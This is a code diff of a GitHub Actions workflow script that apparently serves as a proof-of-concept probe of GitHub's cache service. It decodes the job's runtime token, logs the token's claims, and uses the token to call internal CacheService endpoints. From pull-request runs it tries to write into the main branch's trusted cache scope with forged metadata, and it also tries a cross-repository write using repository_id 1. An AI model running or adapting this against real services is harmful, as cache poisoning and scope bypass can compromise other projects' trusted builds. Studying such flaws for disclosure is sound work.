@@ -13,34 +13,42 @@ jobs:
           script: |
             const t = process.env.ACTIONS_RUNTIME_TOKEN || '';
             const results = process.env.ACTIONS_RESULTS_URL || '';
-            core.info(`event=${context.eventName} ref=${context.ref}`);
-            core.info(`ACTIONS_RESULTS_URL=${results}`);
-            core.info(`ACTIONS_CACHE_SERVICE_V2=${process.env.ACTIONS_CACHE_SERVICE_V2}`);
-            if (!t) { core.info('NO ACTIONS_RUNTIME_TOKEN'); return; }
             const claims = JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString());
-            core.info('--- runtime token claims ---');
-            for (const [k,v] of Object.entries(claims).sort()) {
-              core.info(`  ${k} = ${typeof v === 'string' ? v.slice(0,500) : JSON.stringify(v).slice(0,500)}`);
-            }
+            core.info(`event=${context.eventName} ref=${context.ref}`);
+            core.info(`ac         = ${JSON.stringify(claims.ac)}`);
+            core.info(`acsl       = ${claims.acsl}`);
+            core.info(`trust_tier = ${claims.trust_tier}`);
+            core.info(`repository_id = ${claims.repository_id}`);
+            const VER = 'a'.repeat(64);
             const call = async (method, body, label) => {
               const url = `${results}twirp/github.actions.results.api.v1.CacheService/${method}`;
-              try {
-                const r = await fetch(url, { method:'POST',
-                  headers:{ 'Authorization':`Bearer ${t}`, 'Content-Type':'application/json' },
-                  body: JSON.stringify(body) });
-                const txt = await r.text();
-                core.info(`[${label}] HTTP ${r.status} ${txt.slice(0,300)}`);
-              } catch (e) { core.info(`[${label}] threw ${e.message}`); }
+              const r = await fetch(url, { method:'POST',
+                headers:{ 'Authorization':`Bearer ${t}`, 'Content-Type':'application/json' },
+                body: JSON.stringify(body) });
+              const txt = await r.text();
+              core.info(`[${label}] HTTP ${r.status} ${txt.slice(0,260)}`);
+              return { status: r.status, txt };
             };
-            const KEY = `probe-${context.eventName}-${Date.now()}`;
-            core.info('--- twirp probes ---');
-            await call('CreateCacheEntry', { key: KEY, version: 'v1' }, 'baseline no-metadata');
-            await call('CreateCacheEntry', { key: KEY+'-mainscope', version: 'v1',
-              metadata: { repository_id: String(context.payload.repository.id),
-                          scope: [{ scope: 'refs/heads/main', permission: '3' }] } }, 'metadata scope=refs/heads/main perm=3');
-            await call('CreateCacheEntry', { key: KEY+'-otherrepo', version: 'v1',
-              metadata: { repository_id: '1', scope: [{ scope: 'refs/heads/main', permission: '3' }] } }, 'metadata repository_id=1');
-            await call('GetCacheEntryDownloadURL', { key: 'TRUSTED-MAIN-ONLY', restore_keys: [], version: 'v1' }, 'read TRUSTED-MAIN-ONLY (no metadata)');
-            await call('GetCacheEntryDownloadURL', { key: 'TRUSTED-MAIN-ONLY', restore_keys: [], version: 'v1',
-              metadata: { repository_id: String(context.payload.repository.id),
-                          scope: [{ scope: 'refs/heads/main', permission: '1' }] } }, 'read TRUSTED-MAIN-ONLY w/ main scope');
+            const MAIN_KEY = 'TRUSTED-MAIN-ONLY';
+            const rid = String(claims.repository_id);
+            core.info('--- probes ---');
+            if (context.eventName === 'push') {
+              const c = await call('CreateCacheEntry', { key: MAIN_KEY, version: VER }, 'push: create TRUSTED-MAIN-ONLY');
+              try {
+                const u = JSON.parse(c.txt).signed_upload_url;
+                if (u) {
+                  await fetch(u + '&comp=block&blockid=' + Buffer.from('0'.repeat(16)).toString('base64'),
+                    { method:'PUT', headers:{'x-ms-blob-type':'BlockBlob'}, body:'TRUSTED-CONTENT' });
+                  await call('FinalizeCacheEntryUpload', { key: MAIN_KEY, version: VER, size_bytes: '15' }, 'push: finalize');
+                }
+              } catch(e) { core.info('upload step: ' + e.message); }
+            } else {
+              await call('GetCacheEntryDownloadURL', { key: MAIN_KEY, restore_keys: [], version: VER }, 'PR: read main cache (documented ALLOWED)');
+              await call('CreateCacheEntry', { key: 'PR-OWN-SCOPE', version: VER }, 'PR: write own scope (baseline)');
+              await call('CreateCacheEntry', { key: MAIN_KEY, version: VER,
+                metadata: { repository_id: rid, scope: [{ scope: 'refs/heads/main', permission: '3' }] } },
+                'PR: WRITE into refs/heads/main via metadata  <== THE TEST');
+              await call('CreateCacheEntry', { key: 'XREPO', version: VER,
+                metadata: { repository_id: '1', scope: [{ scope: 'refs/heads/main', permission: '3' }] } },
+                'PR: write with repository_id=1 (cross-repo)');
+            }
